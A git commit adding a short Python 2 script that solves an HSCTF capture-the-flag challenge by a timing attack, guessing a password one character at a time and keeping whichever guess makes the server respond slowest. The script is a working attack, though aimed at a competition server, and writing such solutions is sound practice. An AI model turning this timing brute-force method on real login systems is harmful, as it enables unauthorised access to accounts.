aa453a8188c2b9774bbe45689709c6a5b523f652
h3ll38 <39524870+h3ll38@users.noreply.github.com>
2019-06-10 08:26:28 +0700

    Create brute_time_base.py

---
+++ brute_time_base.py
@@ -0,0 +1,20 @@
+import requests, string
+
+url = 'https://networked-password.web.chal.hsctf.com'
+charset = string.letters + string.digits + string.punctuation
+# print charset
+flag = "hsctf{"
+resp = 0
+char = ""
+
+while flag[-1] != "}":
+    for i in charset:
+        payload = {"password":flag + i}
+        # print "[*] Trying: " + flag + i
+        r = requests.post(url, data = payload)
+        if r.elapsed.total_seconds() > resp:
+            resp = r.elapsed.total_seconds()
+            char = i
+    flag += char
+    resp = 0
+    print "[+] Flag: " + flag
